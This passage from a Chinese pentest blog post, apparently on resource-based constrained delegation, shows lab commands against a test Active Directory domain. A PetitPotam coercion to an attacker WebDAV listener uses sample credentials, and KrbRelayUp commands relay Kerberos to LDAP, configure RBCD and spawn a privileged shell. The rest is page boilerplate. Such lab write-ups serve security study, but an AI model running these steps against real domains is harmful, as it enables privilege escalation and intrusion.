+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">python3</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> PetitPotam.py</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD"> '</span><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">evil@80/webdav</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 192.168.30.30</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -d</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> hack-my.com</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -u</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> Alice</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -p</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD"> '</span><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Alice123!</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">'</span></span></code></pre>
+<p>实测需要等一段时间 + 多次尝试才能成功触发</p>
+<p><img src="https://img.exp10it.io/img/202308012019889.png" alt="image-20230801201948830"></p>
+<p><img src="https://img.exp10it.io/img/202308012020734.png" alt="image-20230801202048680"></p>
+<h2 id="kerberos-relay-to-ldap">Kerberos Relay to LDAP</h2>
+<p>参考文章:</p>
+<p><a href="https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html">https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html</a></p>
+<p><a href="https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html">https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html</a></p>
+<p><a href="https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/">https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/</a></p>
+<p><a href="https://gist.github.com/tothi/bf6c59d6de5d0c9710f23dae5750c4b9">https://gist.github.com/tothi/bf6c59d6de5d0c9710f23dae5750c4b9</a></p>
+<p>大概意思好像是可以通过 DCOM 或者 DNS 触发 Kerberos Relay, 并使用当前机器账户的 ST 中继至 LDAP 服务从而配置 RBCD/Shadow Credentials</p>
+<p>先挖个坑, 找个时间仔细研究一下(</p>
+<p><a href="https://github.com/ShorSec/KrbRelayUp">https://github.com/ShorSec/KrbRelayUp</a></p>
+<p>配置 RBCD</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="shell"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">KrbRelayUp.exe</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> relay</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -Domain</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> hack-my.com</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -CreateNewComputerAccount</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -ComputerName</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> test</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">$ </span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF">-ComputerPassword</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 123456</span></span></code></pre>
+<p>spawn shell, 当然这里也可以用 impacket</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="shell"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">KrbRelayUp.exe</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> spawn</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -m</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> rbcd</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -d</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> hack-my.com</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -dc</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> DC.hack-my.com</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -cn</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> test</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">$ </span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF">-cp</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 123456</span></span></code></pre>
+<p><img src="https://img.exp10it.io/img/202308012033661.png" alt="image-20230801203310510"></p>
+<p><img src="https://img.exp10it.io/img/202308012034182.png" alt="image-20230801203420037"></p> </article> <hr class="my-8 border-dashed"> <a href="https://github.com/X1r0z/exp10it.io/edit/master/src/data/pentest/resource-based-constrained-delegation-attack-summary.md" target="_blank" rel="noopener noreferrer" class="flex justify-baseline gap-1.5 opacity-80 hover:text-accent sm:hidden"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M7 7h-1a2 2 0 0 0 -2 2v9a2 2 0 0 0 2 2h9a2 2 0 0 0 2 -2v-1" /><path d="M20.385 6.585a2.1 2.1 0 0 0 -2.97 -2.97l-8.415 8.385v3h3l8.385 -8.415z" /><path d="M16 5l3 3" /></svg><span>Edit page</span></a> <ul class="mt-4 mb-8 sm:my-8"> <li class="group inline-block group-hover:cursor-pointer my-1 underline-offset-4"> <a href="/tags/rbcd/" class="relative pe-2 text-lg underline decoration-dashed group-hover:-top-0.5 group-hover:text-accent focus-visible:p-1 focus-visible:no-underline text-sm" data-astro-transition-scope="astro-36ssibgs-2"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block opacity-80 -me-3.5 size-4"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M5 9l14 0" /><path d="M5 15l14 0" /><path d="M11 4l-4 16" /><path d="M17 4l-4 16" /></svg>
+&nbsp;<span>RBCD</span> </a> </li><li class="group inline-block group-hover:cursor-pointer my-1 underline-offset-4"> <a href="/tags/ntlm/" class="relative pe-2 text-lg underline decoration-dashed group-hover:-top-0.5 group-hover:text-accent focus-visible:p-1 focus-visible:no-underline text-sm" data-astro-transition-scope="astro-36ssibgs-3"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block opacity-80 -me-3.5 size-4"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M5 9l14 0" /><path d="M5 15l14 0" /><path d="M11 4l-4 16" /><path d="M17 4l-4 16" /></svg>
+&nbsp;<span>NTLM</span> </a> </li><li class="group inline-block group-hover:cursor-pointer my-1 underline-offset-4"> <a href="/tags/kerberos/" class="relative pe-2 text-lg underline decoration-dashed group-hover:-top-0.5 group-hover:text-accent focus-visible:p-1 focus-visible:no-underline text-sm" data-astro-transition-scope="astro-36ssibgs-4"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block opacity-80 -me-3.5 size-4"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M5 9l14 0" /><path d="M5 15l14 0" /><path d="M11 4l-4 16" /><path d="M17 4l-4 16" /></svg>
+&nbsp;<span>Kerberos</span> </a> </li><li class="group inline-block group-hover:cursor-pointer my-1 underline-offset-4"> <a href="/tags/windows/" class="relative pe-2 text-lg underline decoration-dashed group-hover:-top-0.5 group-hover:text-accent focus-visible:p-1 focus-visible:no-underline text-sm" data-astro-transition-scope="astro-36ssibgs-5"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block opacity-80 -me-3.5 size-4"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M5 9l14 0" /><path d="M5 15l14 0" /><path d="M11 4l-4 16" /><path d="M17 4l-4 16" /></svg>
+&nbsp;<span>Windows</span> </a> </li> </ul> <div id="btt-btn-container" class="fixed end-4 bottom-8 z-50 md:sticky md:end-auto md:float-end md:me-1 translate-y-14 opacity-0 transition duration-500"> <button data-button="back-to-top" class="group relative bg-background px-2 py-1 size-14 rounded-full shadow-xl md:h-8 md:w-fit md:rounded-md md:shadow-none md:focus-visible:rounded-none md:bg-background/35 md:bg-clip-padding md:backdrop-blur-lg"> <span id="progress-indicator" class="absolute inset-0 -z-10 block size-14 scale-110 rounded-full bg-transparent md:hidden md:h-8 md:rounded-md"></span> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block rotate-90 md:hidden"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M15 6l-6 6l6 6" /></svg> <span class="sr-only text-sm group-hover:text-accent md:not-sr-only"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-4"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M12 5l0 14" /><path d="M16 9l-4 -4" /><path d="M8 9l4 -4" /></svg>
+Back To Top
+</span> </button> </div> <script data-astro-rerun>
+  /** Scrolls the document to the top when
+   * the "Back to Top" button is clicked. */
+  function backToTop() {
+    const rootElement = document.documentElement;
+    const btnContainer = document.querySelector("#btt-btn-container");
+    const backToTopBtn = document.querySelector("[data-button='back-to-top']");
+    const progressIndicator = document.querySelector("#progress-indicator");
+
+    if (!rootElement || !btnContainer || !backToTopBtn || !progressIndicator)
+      return;
+
+    // Attach click event handler for back-to-top button
+    backToTopBtn.addEventListener("click", () => {
+      document.body.scrollTop = 0; // For Safari
+      document.documentElement.scrollTop = 0; // For Chrome, Firefox, IE and Opera
+    });
+
+    // Handle button visibility according to scroll position
+    let lastVisible = null;
+    function handleScroll() {
+      const scrollTotal = rootElement.scrollHeight - rootElement.clientHeight;
+      const scrollTop = rootElement.scrollTop;
+      const scrollPercent = Math.floor((scrollTop / scrollTotal) * 100);
+
+      progressIndicator.style.setProperty(
+        "background-image",
+        `conic-gradient(var(--accent), var(--accent) ${scrollPercent}%, transparent ${scrollPercent}%)`
+      );
+
+      const isVisible = scrollTop / scrollTotal > 0.3;
+
+      if (isVisible !== lastVisible) {
+        btnContainer.classList.toggle("opacity-100", isVisible);
+        btnContainer.classList.toggle("translate-y-0", isVisible);
+        btnContainer.classList.toggle("opacity-0", !isVisible);
+        btnContainer.classList.toggle("translate-y-14", !isVisible);
+        lastVisible = isVisible;
+      }
+    }
+
+    let ticking = false;
+    document.addEventListener("scroll", () => {
+      if (!ticking) {
+        window.requestAnimationFrame(() => {
+          handleScroll();
+          ticking = false;
+        });
+        ticking = true;
+      }
+    });
+  }
+  backToTop();
+</script> <div class="flex flex-none flex-col items-center justify-center gap-1 md:items-start"><span class="italic">Share this post on:</span><div class="text-center"><a href="https://wa.me/?text=https://exp10it.io/posts/resource-based-constrained-delegation-attack-summary/" class="group inline-block hover:text-accent scale-90 p-2 hover:rotate-6 sm:p-1" title="Share this post via WhatsApp"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M3 21l1.65 -3.8a9 9 0 1 1 3.4 2.9l-5.05 .9" /><path d="M9 10a.5 .5 0 0 0 1 0v-1a.5 .5 0 0 0 -1 0v1a5 5 0 0 0 5 5h1a.5 .5 0 0 0 0 -1h-1a.5 .5 0 0 0 0 1" /></svg><span class="sr-only">Share this post via WhatsApp</span></a><a href="https://www.facebook.com/sharer.php?u=https://exp10it.io/posts/resource-based-constrained-delegation-attack-summary/" class="group inline-block hover:text-accent scale-90 p-2 hover:rotate-6 sm:p-1" title="Share this post on Facebook"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M7 10v4h3v7h4v-7h3l1 -4h-4v-2a1 1 0 0 1 1 -1h3v-4h-3a5 5 0 0 0 -5 5v2h-3" /></svg><span class="sr-only">Share this post on Facebook</span></a><a href="https://x.com/intent/post?url=https://exp10it.io/posts/resource-based-constrained-delegation-attack-summary/" class="group inline-block hover:text-accent scale-90 p-2 hover:rotate-6 sm:p-1" title="Share this post on X"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M4 4l11.733 16h4.267l-11.733 -16z" /><path d="M4 20l6.768 -6.768m2.46 -2.46l6.772 -6.772" /></svg><span class="sr-only">Share this post on X</span></a><a href="https://t.me/share/url?url=https://exp10it.io/posts/resource-based-constrained-delegation-attack-summary/" class="group inline-block hover:text-accent scale-90 p-2 hover:rotate-6 sm:p-1" title="Share this post via Telegram"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M15 10l-4 4l6 6l4 -16l-18 7l4 2l2 6l3 -4" /></svg><span class="sr-only">Share this post via Telegram</span></a><a href="https://pinterest.com/pin/create/button/?url=https://exp10it.io/posts/resource-based-constrained-delegation-attack-summary/" class="group inline-block hover:text-accent scale-90 p-2 hover:rotate-6 sm:p-1" title="Share this post on Pinterest"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M8 20l4 -9" /><path d="M10.7 14c.437 1.263 1.43 2 2.55 2c2.071 0 3.75 -1.554 3.75 -4a5 5 0 1 0 -9.7 1.7" /><path d="M12 12m-9 0a9 9 0 1 0 18 0a9 9 0 1 0 -18 0" /></svg><span class="sr-only">Share this post on Pinterest</span></a><a href="mailto:?subject=See%20this%20post&#38;body=https://exp10it.io/posts/resource-based-constrained-delegation-attack-summary/" class="group inline-block hover:text-accent scale-90 p-2 hover:rotate-6 sm:p-1" title="Share this post via email"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M3 7a2 2 0 0 1 2 -2h14a2 2 0 0 1 2 2v10a2 2 0 0 1 -2 2h-14a2 2 0 0 1 -2 -2v-10z" /><path d="M3 7l9 6l9 -6" /></svg><span class="sr-only">Share this post via email</span></a></div></div> <hr class="my-6 border-dashed"> <!-- Previous/Next Post Buttons --> <div data-pagefind-ignore class="grid grid-cols-1 gap-6 sm:grid-cols-2"> <a href="/posts/chunqiuyunjing-time-writeup" class="flex w-full gap-1 hover:opacity-75"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block flex-none rtl:rotate-180"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M15 6l-6 6l6 6" /></svg> <div> <span>Previous Post</span> <div class="text-sm text-accent/85">春秋云镜 Time Writeup</div> </div> </a> <a href="/posts/chunqiuyunjing-tsclient-writeup" class="flex w-full justify-end gap-1 text-end hover:opacity-75 sm:col-start-2"> <div> <span>Next Post</span> <div class="text-sm text-accent/85">春秋云镜 Tsclient Writeup</div> </div> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block flex-none rtl:rotate-180"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M9 6l6 6l-6 6" /></svg> </a> </div> </main> <footer class="w-full mt-auto"> <div class="mx-auto max-w-app px-0"> <hr class="border-border" aria-hidden="true"> </div> <div class="flex flex-col items-center justify-between py-6 sm:flex-row-reverse sm:py-4"> <div class="flex-wrap justify-center gap-1 flex"> <a href="https://github.com/X1r0z" class="group inline-block hover:text-accent p-2 hover:rotate-6 sm:p-1" title="X1r0z Blog on GitHub"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" /></svg> <span class="sr-only">X1r0z Blog on GitHub</span> </a><a href="https://x.com/X1r0z" class="group inline-block hover:text-accent p-2 hover:rotate-6 sm:p-1" title="X1r0z Blog on X"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M4 4l11.733 16h4.267l-11.733 -16z" /><path d="M4 20l6.768 -6.768m2.46 -2.46l6.772 -6.772" /></svg> <span class="sr-only">X1r0z Blog on X</span> </a><a href="https://www.linkedin.com/in/x1r0z/" class="group inline-block hover:text-accent p-2 hover:rotate-6 sm:p-1" title="X1r0z Blog on LinkedIn"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M8 11v5" /><path d="M8 8v.01" /><path d="M12 16v-5" /><path d="M16 16v-3a2 2 0 1 0 -4 0" /><path d="M3 7a4 4 0 0 1 4 -4h10a4 4 0 0 1 4 4v10a4 4 0 0 1 -4 4h-10a4 4 0 0 1 -4 -4z" /></svg> <span class="sr-only">X1r0z Blog on LinkedIn</span> </a><a href="mailto:i@exp10it.io" class="group inline-block hover:text-accent p-2 hover:rotate-6 sm:p-1" title="Send an email to X1r0z Blog"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M3 7a2 2 0 0 1 2 -2h14a2 2 0 0 1 2 2v10a2 2 0 0 1 -2 2h-14a2 2 0 0 1 -2 -2v-10z" /><path d="M3 7l9 6l9 -6" /></svg> <span class="sr-only">Send an email to X1r0z Blog</span> </a> </div> <div class="my-2 flex flex-col items-center whitespace-nowrap sm:flex-row"> <span>Copyright &#169; 2026</span> <span class="hidden sm:inline">&nbsp;|&nbsp;</span> <span>All rights reserved.</span> </div> </div> </footer>  </body></html> <script data-astro-rerun>
+  /** Create a progress indicator
+   *  at the top */
+  function createProgressBar() {
+    // Create the main container div
+    const progressContainer = document.createElement("div");
+    progressContainer.className =
+      "progress-container fixed top-0 z-10 h-1 w-full bg-background";
+
+    // Create the progress bar div
+    const progressBar = document.createElement("div");
+    progressBar.className = "progress-bar h-1 w-0 bg-accent";
+    progressBar.id = "myBar";
+
+    // Append the progress bar to the progress container
+    progressContainer.appendChild(progressBar);
+
+    // Append the progress container to the document body or any other desired parent element
+    document.body.appendChild(progressContainer);
+  }
+  createProgressBar();
+
+  /** Update the progress bar
+   *  when user scrolls */
+  function updateScrollProgress() {
+    document.addEventListener("scroll", () => {
+      const winScroll =
+        document.body.scrollTop || document.documentElement.scrollTop;
+      const height =
+        document.documentElement.scrollHeight -
+        document.documentElement.clientHeight;
+      const scrolled = (winScroll / height) * 100;
+      if (document) {
+        const myBar = document.getElementById("myBar");
+        if (myBar) {
+          myBar.style.width = scrolled + "%";
+        }
+      }
+    });
+  }
+  updateScrollProgress();
+
+  /** Attaches links to headings in the document,
+   *  allowing sharing of sections easily */
+  function addHeadingLinks() {
+    const headings = Array.from(
+      document.querySelectorAll("h2, h3, h4, h5, h6")
+    );
+    for (const heading of headings) {
+      heading.classList.add("group");
+      const link = document.createElement("a");
+      link.className =
+        "heading-link ms-2 no-underline opacity-75 md:opacity-0 md:group-hover:opacity-100 md:focus:opacity-100";
+      link.href = "#" + heading.id;
+
+      const span = document.createElement("span");
+      span.ariaHidden = "true";
+      span.innerText = "#";
+      link.appendChild(span);
+      heading.appendChild(link);
+    }
+  }
+  addHeadingLinks();
+
+  /** Attaches copy buttons to code blocks in the document,
+   * allowing users to copy code easily. */
+  function attachCopyButtons() {
+    const copyButtonLabel = "Copy";
+    const codeBlocks = Array.from(document.querySelectorAll("pre"));
+
+    for (const codeBlock of codeBlocks) {
+      const wrapper = document.createElement("div");
+      wrapper.style.position = "relative";
+
+      // Check if --file-name-offset custom property exists
+      const computedStyle = getComputedStyle(codeBlock);
+      const hasFileNameOffset =
+        computedStyle.getPropertyValue("--file-name-offset").trim() !== "";
+
+      // Determine the top positioning class
+      const topClass = hasFileNameOffset
+        ? "top-(--file-name-offset)"
+        : "-top-3";
+
+      const copyButton = document.createElement("button");
+      copyButton.className = `copy-code absolute end-3 ${topClass} rounded bg-muted border border-muted px-2 py-1 text-xs leading-4 text-foreground font-medium`;
+      copyButton.innerHTML = copyButtonLabel;
+      codeBlock.setAttribute("tabindex", "0");
+      codeBlock.appendChild(copyButton);
+
+      // wrap codebock with relative parent element
+      codeBlock?.parentNode?.insertBefore(wrapper, codeBlock);
+      wrapper.appendChild(codeBlock);
+
+      copyButton.addEventListener("click", async () => {
+        await copyCode(codeBlock, copyButton);
+      });
+    }
+
+    async function copyCode(block, button) {
+      const code = block.querySelector("code");
+      const text = code?.innerText;
+
+      await navigator.clipboard.writeText(text ?? "");
+
+      // visual feedback that task is completed
+      button.innerText = "Copied";
+
+      setTimeout(() => {
+        button.innerText = copyButtonLabel;
+      }, 700);
+    }
+  }
+  attachCopyButtons();
+
+  /* Go to page start after page swap */
+  document.addEventListener("astro:after-swap", () =>
+    window.scrollTo({ left: 0, top: 0, behavior: "instant" })
+  );
+</script>
